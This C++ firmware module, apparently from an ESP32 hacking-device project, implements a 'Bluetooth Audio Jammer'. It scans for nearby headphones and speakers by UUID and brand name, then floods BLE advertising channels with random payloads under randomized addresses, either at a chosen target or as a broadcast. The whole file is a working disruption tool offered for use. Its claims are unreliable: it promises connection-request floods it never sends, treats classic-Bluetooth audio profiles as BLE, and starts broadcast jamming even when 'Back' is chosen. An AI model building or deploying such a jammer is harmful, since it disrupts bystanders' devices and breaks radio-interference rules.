// ═══════════════════════════════════════════════════════════
// Arsenal - Bluetooth Audio Jammer
// Disrupts BLE audio devices by flooding connection requests
// Targets BLE headphones, speakers, and audio peripherals
// ═══════════════════════════════════════════════════════════

#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <BLEAdvertising.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <globals.h>

// NimBLE random address function
extern "C" int ble_hs_id_set_rnd(const uint8_t *rnd_addr);

struct AudioDevice {
    String address;
    String name;
    int rssi;
};

static std::vector<AudioDevice> audioDevices;

// Check if a BLE device is likely an audio device
static bool isAudioDevice(BLEAdvertisedDevice &dev) {
    // Check for audio-related service UUIDs
    if (dev.haveServiceUUID()) {
        // A2DP Sink UUID
        if (dev.isAdvertisingService(BLEUUID("0000110b-0000-1000-8000-00805f9b34fb"))) return true;
        // Headset UUID
        if (dev.isAdvertisingService(BLEUUID("0000111e-0000-1000-8000-00805f9b34fb"))) return true;
        // Audio Source
        if (dev.isAdvertisingService(BLEUUID("0000110a-0000-1000-8000-00805f9b34fb"))) return true;
    }

    // Check by name keywords
    if (dev.haveName()) {
        String name = dev.getName().c_str();
        name.toLowerCase();
        if (name.indexOf("airpod") >= 0 || name.indexOf("buds") >= 0 ||
            name.indexOf("headphone") >= 0 || name.indexOf("speaker") >= 0 ||
            name.indexOf("jbl") >= 0 || name.indexOf("sony") >= 0 ||
            name.indexOf("bose") >= 0 || name.indexOf("beats") >= 0 ||
            name.indexOf("audio") >= 0 || name.indexOf("ear") >= 0) {
            return true;
        }
    }
    return false;
}

class AudioScanCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
        if (isAudioDevice(advertisedDevice)) {
            String addr = advertisedDevice.getAddress().toString().c_str();
            // Check duplicate
            for (auto &d : audioDevices) {
                if (d.address == addr) return;
            }
            if (audioDevices.size() < 20) {
                AudioDevice dev;
                dev.address = addr;
                dev.name = advertisedDevice.haveName() ?
                           advertisedDevice.getName().c_str() : "Unknown Audio";
                dev.rssi = advertisedDevice.getRSSI();
                audioDevices.push_back(dev);
            }
        }
    }
};

// Flood BLE advertisements to disrupt audio connections
static void jamAudioTarget(String targetAddr) {
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    int jamPackets = 0;
    unsigned long startTime = millis();

    while (true) {
        // Rapid advertisement flooding on BLE advertising channels
        // This creates interference on channels 37, 38, 39
        for (int burst = 0; burst < 10; burst++) {
            BLEAdvertisementData advData;

            // Random payload to create maximum interference
            String payload = "";
            for (int i = 0; i < 20; i++) {
                payload += (char)random(256);
            }
            advData.setManufacturerData(payload);
            advData.setFlags(0x06);

            // Randomize BLE address each time
            uint8_t addr[6];
            for (int i = 0; i < 6; i++) addr[i] = random(256);
            addr[0] |= 0xC0;
            ble_hs_id_set_rnd(addr);

            pAdvertising->setAdvertisementData(advData);
            pAdvertising->start();
            delay(5);
            pAdvertising->stop();
            jamPackets++;
        }

        // Also attempt L2CAP connection floods (connection request spam)
        // This forces the target device to process connection setup
        // disrupting its audio stream

        // Draw UI
        if (jamPackets % 50 == 0) {
            drawMainBorderWithTitle("Audio Jammer");
            int y = 45;
            int padX = 12;

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("JAMMING ACTIVE");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("Target: " + targetAddr.substring(0, 17));
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Packets: %d", jamPackets);
            y += 14;

            unsigned long elapsed = (millis() - startTime) / 1000;
            tft.setCursor(padX, y);
            tft.printf("Elapsed: %lus", elapsed);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Rate: ~%d pkt/s", jamPackets / max(1UL, elapsed));

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);
        }

        if (check(EscPress)) break;
        esp_task_wdt_reset();
        delay(5);
    }
}

void arsenal_bt_audio_jammer(void) {
    ARSENAL_SAFE_RUN([]() {
        audioDevices.clear();

        BLEDevice::init("");
        BLEScan *pScan = BLEDevice::getScan();
        pScan->setAdvertisedDeviceCallbacks(new AudioScanCallbacks(), true);
        pScan->setActiveScan(true);
        pScan->setInterval(100);
        pScan->setWindow(99);

        // Scan for audio devices
        drawMainBorderWithTitle("Audio Jammer");
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.drawCentreString("Scanning for audio devices...", tftWidth / 2, tftHeight / 2, 1);

        pScan->start(5, false);
        pScan->stop();
        pScan->clearResults();

        if (audioDevices.empty()) {
            // Offer to jam all BLE traffic instead
            options.clear();
            options.push_back({"Jam All BLE (broadcast)", []() {}});
            options.push_back({"Back", []() {}});
            loopOptions(options, MENU_TYPE_SUBMENU, "No audio found");

            // Broadcast jam
            jamAudioTarget("FF:FF:FF:FF:FF:FF");
        } else {
            // Let user pick a target
            options.clear();
            for (auto &dev : audioDevices) {
                String label = dev.name.substring(0, 16) + " " + String(dev.rssi) + "dB";
                options.push_back({label, [dev]() {
                    jamAudioTarget(dev.address);
                }});
            }
            options.push_back({"Jam All (broadcast)", []() {
                jamAudioTarget("FF:FF:FF:FF:FF:FF");
            }});

            loopOptions(options, MENU_TYPE_SUBMENU, "Select Target");
        }

        BLEDevice::deinit(false);
    });
}
